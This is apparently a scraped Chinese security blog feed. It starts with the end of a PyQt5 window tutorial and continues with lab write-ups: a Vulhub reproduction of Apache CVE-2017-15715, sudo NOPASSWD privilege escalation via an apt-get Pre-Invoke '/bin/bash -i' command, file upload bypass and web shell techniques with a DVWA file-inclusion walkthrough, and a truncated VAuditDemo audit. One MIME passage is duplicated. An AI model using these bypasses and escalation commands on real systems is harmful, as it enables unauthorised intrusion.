self.setToolTip(&quot;有何贵干老铁？&quot;) #窗体提示框if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p>注意：按钮不能放在show()下面，因为窗体出现后就不会在加载任何东西了<br><img src="https://s2.ax1x.com/2019/01/24/kZPsz9.png" alt="kZPsz9.png"></p><p><img src="https://s2.ax1x.com/2019/01/24/kZPgqx.png" alt="kZPgqx.png"></p><p><b>按钮事件</b><br>也就是说在点击按钮后会执行对应的事件</p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTipfrom PyQt5.QtGui import QFontfrom PyQt5.QtCore import QCoreApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        QToolTip.setFont(QFont(&#39;SansSerif&#39;,10))        btn=QPushButton(&quot;提交&quot;,self)        btn.clicked.connect(QCoreApplication.instance().quit) #点击按钮后会退出，QCoreApplication.instance().quit是退出所有程序的事件        btn.resize(btn.sizeHint())        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)        btn.move(102,102)        self.setGeometry(300,300,300,300)        self.setWindowTitle(&quot;源氏&quot;)        self.show()        self.setToolTip(&quot;有何贵干老铁？&quot;)if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kZijn1.png" alt=""></p><p><b>关闭窗口</b></p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip,QMessageBoxfrom PyQt5.QtGui import QFontfrom PyQt5.QtCore import QCoreApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        QToolTip.setFont(QFont(&#39;SansSerif&#39;,10))        btn=QPushButton(&quot;提交&quot;,self)        btn.clicked.connect(QCoreApplication.instance().quit)        btn.resize(btn.sizeHint())        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)        btn.move(102,102)        self.setGeometry(300,300,300,300)        self.setWindowTitle(&quot;源氏&quot;)        self.show()        self.setToolTip(&quot;有何贵干老铁？&quot;)    def closeEvent(self, event): #重新定义了closeEvent(),改变控件的默认行为，就是替换掉默认的事件处理。        reply=QMessageBox.question(self,&#39;退出&#39;,&#39;你真的要退出吗？&#39;,QMessageBox.Yes| QMessageBox.No,QMessageBox.No) #退出选择，第一个是退出框的标题，第二个退出框的说明，第三个是按钮，第四个也是按钮，第五个是默认按钮        if reply==QMessageBox.Yes: #如果选择YES就退出            event.accept()        else:            event.ignore()if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kZkPaV.png" alt=""></p><p><b>居中对齐</b></p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip,QMessageBox,QDesktopWidgetfrom PyQt5.QtGui import QFontfrom PyQt5.QtCore import QCoreApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        QToolTip.setFont(QFont(&#39;SansSerif&#39;,10))        btn=QPushButton(&quot;提交&quot;,self)        btn.clicked.connect(QCoreApplication.instance().quit)        btn.resize(btn.sizeHint())        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)        qr = self.frameGeometry() #获取桌面分辨率        cp = QDesktopWidget().availableGeometry().center() #获取中心位置        qr.moveCenter(cp) #获取窗口中心位置        self.resize(300,250)        self.move(qr.topLeft()) #移动到中心        self.setWindowTitle(&quot;源氏&quot;)        self.show()        self.setToolTip(&quot;有何贵干老铁？&quot;)    def closeEvent(self, event):        reply=QMessageBox.question(self,&#39;退出&#39;,&#39;你真的要退出吗？&#39;,QMessageBox.Yes| QMessageBox.No,QMessageBox.No)        if reply==QMessageBox.Yes:            event.accept()        else:            event.ignore()if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kZkLe1.md.png" alt=""></p><p><b>给窗体设置logo</b><br>这里我就用这张图<br><img src="http://img.inmywordz.com/uploads/20170710120441_39.jpg" alt="20170710120441_39.jpg"></p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTip,QMessageBox,QDesktopWidgetfrom PyQt5.QtGui import QFont,QIconfrom PyQt5.QtCore import QCoreApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        self.setWindowIcon(QIcon(&#39;1.jpg&#39;))  # w.setWindowIcon(QIcon(&#39;图片名称&#39;)) #设置logo        QToolTip.setFont(QFont(&#39;SansSerif&#39;,10))        btn=QPushButton(&quot;提交&quot;,self)        btn.clicked.connect(QCoreApplication.instance().quit)        btn.resize(btn.sizeHint())        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;)        qr = self.frameGeometry()        cp = QDesktopWidget().availableGeometry().center()        qr.moveCenter(cp)        self.resize(300,250)        self.move(qr.topLeft())        self.setWindowTitle(&quot;源氏&quot;)        self.show()        self.setToolTip(&quot;有何贵干老铁？&quot;)    def closeEvent(self, event):        reply=QMessageBox.question(self,&#39;退出&#39;,&#39;你真的要退出吗？&#39;,QMessageBox.Yes| QMessageBox.No,QMessageBox.No)        if reply==QMessageBox.Yes:            event.accept()        else:            event.ignore()if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kZEkjJ.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-15715 Repetition</title>
      <link href="/posts/6bc983cd.html"/>
      <url>/posts/6bc983cd.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续复现CVE，之前复现了两个CVE,分别是CVE-2015-5254，CVE-2016-3088。现在轮到<br>CVE-2017-15715<br><img src="http://d.ifengimg.com/w600/e0.ifengimg.com/09/2018/1202/BE29F14379EA67C985989BA1CB839741BB0CB6D0_size172_w1920_h1080.jpeg" alt="BE29F14379EA67C985989BA1CB839741BB0CB6D0_size172_w1920_h1080.jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞简介</b><br>Apache HTTPD 换行解析漏洞（CVE-2017-15715）<br>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><b>靶场搭建</b><br>这里下载docker环境：<a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a><br>然后进入httpd，进入CVE-2017-15715</p><pre><code>cd vulhub/vulhub/httpd/CVE-2017-15715sudo docker-compose buildsudo docker-compose up -d</code></pre><p><b>踩到的坑</b><br>进入靶机后自己写个表单。靶机里面只给了index.php…真是mmp，我折腾了半天<br>发现不能像普通那样传参,也就是$_FILE[‘file’][‘name’]这样，否则输入的%0a会被自动过滤掉。哇草，坑了我半天，解决这个坑的文章<a href="https://www.cnblogs.com/leixiao-/p/10223090.html" target="_blank" rel="noopener">Apache HTTPD 换行解析漏洞（CVE-2017-15715）&amp;&amp; Apache HTTPD 未知后缀解析漏洞 - 淚笑 - 博客园</a></p><p><b>实验</b><br>环境搭建好后，访问<a href="http://127.0.0.1:8080,会出现以下图片一样" target="_blank" rel="noopener">http://127.0.0.1:8080,会出现以下图片一样</a><br><img src="https://s2.ax1x.com/2019/01/23/kEFk1s.png" alt="kEFk1s.png"></p><p>然后去到自己写的表单那里，上传文件输入文件名burp抓包<br><img src="https://s2.ax1x.com/2019/01/23/kEF6DP.png" alt="kEF6DP.png"></p><p>直接上传php是不成功的<br><img src="https://s2.ax1x.com/2019/01/23/kEFLUU.png" alt="kEFLUU.png"></p><p>在php后面插入一个0a就能触发换行解析漏洞<br>未添加之前：<br><img src="https://s2.ax1x.com/2019/01/23/kEkfZ6.png" alt="kEkfZ6.png"></p><p>添加之后：<br><img src="https://s2.ax1x.com/2019/01/23/kEkvo8.png" alt="kEkvo8.png"></p><p>最终结果：<br><img src="https://s2.ax1x.com/2019/01/23/kEASJg.png" alt="kEASJg.png"></p><p>靶机里面上传的文件：<br><img src="https://s2.ax1x.com/2019/01/23/kEAGTK.md.png" alt="kEAGTK.md.png"></p><p>最终访问：<br>访问也要加上%0a<br><a href="http://192.168.89.157:8080/demo3s.php%0a?r=phpinfo()" target="_blank" rel="noopener">http://192.168.89.157:8080/demo3s.php%0a?r=phpinfo()</a>;<br><img src="https://s2.ax1x.com/2019/01/23/kEEeBt.png" alt="kEEeBt.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux abuse of rights</title>
      <link href="/posts/f448c508.html"/>
      <url>/posts/f448c508.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过LInux在/etc/sudoers滥配置的提权研究，原文：<a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity</a><br><img src="http://img1.vhaor.com/mmbiz_jpg/b69RXPicqD0jxAxEowBrtc5ppKQmvTBfpNstJ0AfSPulBQ4E9Ku1sQOYYrNalqOiayFQxVfh6FfBbJfReWxicdHfQ/640?wx_fmt=jpeg" alt="640?wx_fmt=jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>为了做好实验我们先做好对应的准备，原文有针对以下几个滥用的提权</p><pre><code>NOPASSWD的两个apt-get dpkgNOPASSWD与/usr/local/openresty/nginx/nginx权限为777 openresty </code></pre><p>系统环境为：</p><pre><code>Ubuntu 16.04</code></pre><p>Ubuntu默认没有安装openresty,安装方法：<a href="https://blog.csdn.net/zstu_cc/article/details/50334585" target="_blank" rel="noopener">Ubuntu 平台下OpenResty的安装 - zstu_cc的专栏 - CSDN博客</a><br>配置出一个存在提权漏洞的环境：<br>sudo vim /etc/sudoers</p><pre><code>cs ALL=(ALL)NOPASSWD:/usr/bin/apt-get,/usr/bin/nginx,/usr/bin/dpkg这里的cs为你要测试的用户名NOPASSWD后面的是执行sudo后不用输入密码的命令</code></pre><p><img src="https://s2.ax1x.com/2019/01/22/kkwtW4.png" alt="kkwtW4.png"></p><p>配置完之后，切换一个没root权限的用户输入sudo -l即可看到刚刚配置的操作<br><img src="https://s2.ax1x.com/2019/01/22/kkwDw6.png" alt="kkwDw6.png"></p><h4 id="NOPASSWD-apt提权"><a href="#NOPASSWD-apt提权" class="headerlink" title="NOPASSWD:apt提权"></a>NOPASSWD:apt提权</h4><p>查看apt-get帮助手册可以看见，-o []option]的参数用户可以自行设置<br>图片借用原文：<br><img src="https://lsdsecurity.com/storage/2019/01/aptgetman.png" alt="aptgetman.png"></p><pre><code>执行：apt update APT::Update::Pre-InVoke::=&quot;/bin/bash -i&quot;</code></pre><p>发现权限已经变更<br><img src="https://s2.ax1x.com/2019/01/22/kkBTzQ.png" alt="kkBTzQ.png"></p><pre><code>Pre-Invoke是预调用的意思</code></pre><h4 id="usr-local-openresty-nginx-nginx提权"><a href="#usr-local-openresty-nginx-nginx提权" class="headerlink" title="/usr/local/openresty/nginx/nginx提权"></a>/usr/local/openresty/nginx/nginx提权</h4><p>这里我没有成功，由于/us/local/openresty/nginx/sbin/nginx权限为777，导致可以随意写入<br>执行：</p><pre><code>echo &quot;/bin/bash -i&quot; &gt; /usr/local/openresty/nginx/sbin/nginx</code></pre><p><img src="https://s2.ax1x.com/2019/01/22/kkg7tI.png" alt="kkg7tI.png"><br>然后原文是执行openrety即可提权成功<br><img src="https://s2.ax1x.com/2019/01/22/kk2eHJ.png" alt="kk2eHJ.png"></p><p><img src="https://s2.ax1x.com/2019/01/22/kk2a4I.md.png" alt="kk2a4I.md.png"><br>知道怎么回事的师父可以告诉我一下吗= =#！</p><p>后面的完全不知道怎么操作<br><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Summary of File Upload Vulnerabilities</title>
      <link href="/posts/d9bed590.html"/>
      <url>/posts/d9bed590.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对文件上传漏洞的一些总结，由于某游戏影响导致今天没什么状态。现已删除该游戏<br><img src="http://p0.ifengimg.com/pmop/2017/02/01/24e0d955-ab0f-4c1d-adb1-7e4f8b970aa9.jpg" alt="24e0d955-ab0f-4c1d-adb1-7e4f8b970aa9.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>说明：</p><pre><code>文件上传本不是漏洞，但是由于后端程序处理逻辑有问题导致发生文件上传漏洞。上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。上传文件是Flash的策略文件crossdomain.xml，可以控制Flash在域下的该行为。上传文件是病毒，木马文件，用以诱骗优化或者管理员下载执行。除此之外，还有一些不常见的利用方法。比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件当是内容里面包含了PHP脚本，在通过本地文件包含漏洞或者解析漏洞使其解析。执行里面的内容</code></pre><p>完成攻击具备的要求：</p><pre><code>用户上传的文件能被容器解释执行，所以文件上传后所在的目录要是web容器所覆盖到的路径其次，用户能够从web访问这个文件，如果文件上传，但用户无法通过web访问，或者无法得到web容器解释这个脚本，那么也不能称之为漏洞最后，用户上传的文件若被安全检查，格式化，图片压缩等功能改变了内容，则也可能导致攻击不成功</code></pre><p>一些常见的解析漏洞</p><pre><code>从FCKEditor文件上传漏洞：FCKEditor是一款非常流行的富文本编辑器，为了方便用户，它带有一个文件上传功能，但是这个功能却出过多次漏洞FCKEditor针对ASP/PHP/JSP等环境都有对应的版本，以PHP为例，其文件上传功能在：/FCKEditor/editor/filemanager/browser/default/browser.html目录解析（6.0）形式：www.xxx.com/xx.asp/xx.jpg原理：服务器默认会把.asp,.asp目录下的文件都解析成asp文件文件解析形式：www.xx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了解析文件类型：IIS6.0默认的可执行文件除了asp还包含这三种：asa,cer,cdx/test.asa/test.cer/test.cdxapache解析漏洞原理：Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如：test.php.qwe.asd .qwe和.asd这两种后缀是apache不可识别解析，apache就会把kd.php.asa.wrwq 解析为：kd.php漏洞形式：www.xx.com/xx.php.php123其余问题导致漏洞：如果在Apache的conf里面有这样一行配置AddHandler php5-script.php 这时只要文件名包含.php及时文件名是test2.php.jpg也会按照php来执行如果在Apache的conf里面有这样一行配置AddType application/x-httpd-php.jpg及时后缀名是.jpg一样能以php方式执行修复方案apache配置文件，禁止.php.这样的文件执行，配置文件里面加入用伪静态能解决这个问题，重写类似于.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so把#号去掉，重启apache，在网站目录下建立.htaccess文件nginx解析漏洞原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则设置SCRIPT_FILENAME。当访问www.xxx.com/phpinfo.jpg/1..php这个url的时，$fastcgi_script_name会被设置为phpinfo.jpg/1.php,然后构造成SCRIPT_FILENAME传递给PHPCGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为php文件解析呢？这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发PHP如下的逻辑：php会认为SCRIPT_FILENAME是phpinfo.jpg,而1.php是PATH_INFO，所以就会将phpinfo.jpg作为php文件来解析了漏洞形式www.xxx.com/UploadFiles/image/1.jpg/x.phpwww.xxx.com/UploadFiles/image/1.jpg%00.phpwww.xxx.com/UploadFiles/image/1.jpg/%20\0.phptest.jpg里面的内容为：&lt;?php xxxx;?&gt;另外一种手法：上传一个名字为test.jpg然后访问test.jpg/.php在这个目录下就会生成一句话木马shell.phpIIS7.5解析漏洞IIS7.5的漏洞与nginx类似，都是由于php配置文件中，开启了cgi.fix_pathinfo,而这并不是nginx或者iis7.5本身的漏洞上传不符合windows文件名规则的文件名：test.asatest.asp(空格)test.php:1.jpgtest.php::$DATA会被windows系统自动去掉不符合规则符号后面的内容</code></pre><p>绕过文件上传功能检查</p><pre><code>一般都是通过文件名后缀检查。但是在某些时候攻击者手动修改了上传过程的POST包，在文件名后添加了一个%00字节额，则可以截断某些函数对文件名的判断。因为在许多语言的函数中，比如在C，PHP等语言的常用字符串处理函数中，0x00被认为是终止符。受此影响的环境有web应用和一些服务器。比如应用原本只允许上传jpg图片，那么可以构造文件名为xxx.php[\0].jpg,其中[\0]为十六进制的0x00字符，.jpg绕过了应用的上传文件类判断，但对于服务器来说，此文件因为0x00字符截断的关闭，最终变成了xxx.php。客户端效验一般都是在网页上写一段javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时还没发送数据包。客户端绕过利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可服务端效验content-type字段效验绕过方式：抓包将content-type字段改为image/gif文件头效验可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”（2）  .gif，”GIF 89A”（3）  .zip，”Zip Compressed”（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”文件头绕过在木马内容基础上再加了一些文件信息，有点像下面的结构或者使用copy命令将需要对应文件头的例如图片和一句话木马合为一个在上传copy xx.jpg/b+dd.php/a xd.php GIF9a&lt;?php phpinfo();?&gt;MIME验证MIME验证MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 它是一个互联网标准，扩展了电子邮件标准，使其能够支持： 非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。 这个标准被定义在RFC 2045、RFC 2046、RFC 2047、RFC 2048、RFC 2049等RFC中。 MIME改善了由RFC 822转变而来的RFC 2822，这些旧标准规定电子邮件标准并不允许在邮件消息中使用7位ASCII字符集以外的字符。正因如此，一些非英语字符消息和二进制文件，图像，声音等非文字消息原本都不能在电子邮件中传输(MIME可以)。MIME规定了用于表示各种各样的数据类型的符号化方法。 此外，在万维网中使用的HTTP协议中也使用了MIME的框架，标准被扩展为互联网媒体类型。MIME的作用使客户端软件区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。 Web服务器使用MIME来说明发送数据的种类，Web客户端使用MIME来说明希望接收到的数据种类。一个普通的文本邮件的信息包含一个头部分（To: From: Subject: 等等）和一个体部分（Hello Mr.,等等）。在一个符合MIME的信息中，也包含一个信息头并不奇怪，邮件的各个部分叫做MIME段，每段前也缀以一个特别的头。MIME邮件只是基于RFC 822邮件的一个扩展，然而它有着自己的RFC规范集。头字段：MIME头根据在邮件包中的位置，大体上分为MIME信息头和MIME段头。（MIME信息头指整个邮件的头，而MIME段头只每个MIME段的头。）MIME验证MIME验证MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 它是一个互联网标准，扩展了电子邮件标准，使其能够支持： 非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。 这个标准被定义在RFC 2045、RFC 2046、RFC 2047、RFC 2048、RFC 2049等RFC中。 MIME改善了由RFC 822转变而来的RFC 2822，这些旧标准规定电子邮件标准并不允许在邮件消息中使用7位ASCII字符集以外的字符。正因如此，一些非英语字符消息和二进制文件，图像，声音等非文字消息原本都不能在电子邮件中传输(MIME可以)。MIME规定了用于表示各种各样的数据类型的符号化方法。 此外，在万维网中使用的HTTP协议中也使用了MIME的框架，标准被扩展为互联网媒体类型。MIME的作用使客户端软件区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。 Web服务器使用MIME来说明发送数据的种类，Web客户端使用MIME来说明希望接收到的数据种类。一个普通的文本邮件的信息包含一个头部分（To: From: Subject: 等等）和一个体部分（Hello Mr.,等等）。在一个符合MIME的信息中，也包含一个信息头并不奇怪，邮件的各个部分叫做MIME段，每段前也缀以一个特别的头。MIME邮件只是基于RFC 822邮件的一个扩展，然而它有着自己的RFC规范集。头字段：MIME头根据在邮件包中的位置，大体上分为MIME信息头和MIME段头。（MIME信息头指整个邮件的头，而MIME段头只每个MIME段的头。）mime类型https://www.bugbank.cn/images/article/20170804/ee885613e9382e1bc8f6b88e1ffa96ab.jpgmimetype判断一般先判断内容的前十个字节，来判断文件类型，然后再判断后缀名文件名扩展绕过前提：黑名单效验黑名单检测：一般有个专门的blacklist文件，里面会包含常见的危险脚本文件绕过方法：找黑名单扩展名的漏网之鱼 - 比如asa和cer之类的可能存在大小写绕过漏洞 - 比如aSp和pHp之类能被解析的文件名扩展名列表jsp jspx jspfasp asa cer aspx配合文件包含漏洞前提：存在文件包含漏洞绕过方式：（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：（2）linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。如上传一句话图片木马，马子未被执行，可以使用包含漏洞，调出一句话图片木马，代码被执行。</code></pre><p>WAF绕过</p><pre><code>垃圾数据有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验https://www.bugbank.cn/images/article/20170804/219cdfec2d4ebd194e20c4a1d4077bec.jpgPOST/GET有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET。修改数据包里面的一些参数，如这篇文章：https://422926799.github.io/2018/08/06/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8A%E4%BC%A0/</code></pre><p>修复方法：</p><pre><code>1、文件上传的目录设置为不可执行2、判断文件类型：强烈推荐白名单方式。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。3、使用随机数改写文件名和文件路径：一个是上传后无法访问；再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。4、单独设置文件服务器的域名：由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</code></pre><p>生成针对黑名单检测的后缀名字典进行爆破：<a href="https://www.freebuf.com/articles/web/188464.html" target="_blank" rel="noopener">构造优质上传漏洞Fuzz字典 - FreeBuf互联网安全新媒体平台</a></p><p>那里存在文件上传漏洞</p><pre><code>服务器配置不当开源编辑器的上传漏洞本地文件上传限制被绕过过滤不严或被绕过文件解析漏洞导致文件执行文件路径截断</code></pre><p>靶场测试;<br>DVWA文件上传高级+本地文件包含<br>首先看一波文件上传高级的代码</p><pre><code>&lt;?phpif( isset( $_POST[ &#39;Upload&#39; ] ) ) { /*判断是否存在Upload这个POST请求变量*/    // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; /*上传成功后的路径*/    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );/* 函数返回路径中的文件名部分*/    // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); /*strrpos获取指定字符串最后出现的地方的位置，获取后缀名*/    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];    $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];    // Is it an image?     if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;        ( $uploaded_size &lt; 100000 ) &amp;&amp; /*判断是否为jpg或jpeg或png的后缀名和文件大小小于100000和获取图像大小，getimagesize()获取图像大小随便还检查了文件头部，如果文件不为图像返回一个False*/        getimagesize( $uploaded_tmp ) ) {        // Can we move the file to the upload folder?         if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { /*move_upload_file()如果这是一个合法的文件将其移到新的位置，这里的判断是如果文件不合法*/            // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;        }        else {            // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;        }    }    else {        // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;    }}?&gt; </code></pre><p>使用copy命令将一张图片和马子合在一起<br><img src="https://s2.ax1x.com/2019/01/21/kiUwQ0.png" alt="kiUwQ0.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiUgY9.png" alt="kiUgY9.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiUHFH.png" alt="kiUHFH.png"><br>本地包含</p><pre><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file:///I:\phpstudy\PHPTutorial\WWW\DVWA-master\hackable\uploads\bc.jpg</code></pre><p><img src="https://s2.ax1x.com/2019/01/21/kiapTg.png" alt="kiapTg.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiaVXV.png" alt="kiaVXV.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiaKk4.png" alt="kiaKk4.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vauditdemo reloading vulnerability recurrence</title>
      <link href="/posts/70e2f438.html"/>
      <url>/posts/70e2f438.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚上刚回到家，发现不值得老哥发了篇文章给我。我赶紧打开看了一看，叮代码审计+复现，[滑稽]<br>剩下自己脑补发生的事情。附上不值得老哥的文章：<a href="http://www.sariel.top/2019/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">vauditdemo重装漏洞 复现 | 只因不值得</a><br><img src="https://images.900.tw/upload_file/41/content/18bc0c10-58ea-136a-9bb8-775436fcc920.jpg" alt="18bc0c10-58ea-136a-9bb8-775436fcc920.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先先看主文件，index.php</p><pre><code>&lt;?php require_once(&#39;sys/config.php&#39;); /*引用sys/config.php*/require_once(&#39;header.php&#39;); /*引用header.php*/?&gt;&lt;div class=&quot;row&quot;&gt;    &lt;?php    /* Include */    if (isset($_GET[&#39;module&#39;])){        include($_GET[&#39;module&#39;].&#39;.inc&#39;);    }else{    ?&gt;    &lt;div class=&quot;jumbotron&quot; style=&quot;text-align: center;&quot;&gt;        &lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;        &lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;    &lt;/div&gt;    &lt;div class=&quot;col-lg-12&quot;&gt;        &lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;        &lt;p&gt;&lt;/p&gt;    &lt;/div&gt;    &lt;?php    }    ?&gt;&lt;/div&gt;&lt;?phprequire_once(&#39;footer.php&#39;);?&gt;</code></pre><p>发现开头就引用了config.php和header.php二话不说，跟过去看看，header.php没什么东西看install.php</p><pre><code>&lt;?phpif ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;) ) { /*判断是否有/sys/install.lock这个文件*/    header( &quot;Location: ../index.php&quot; ); 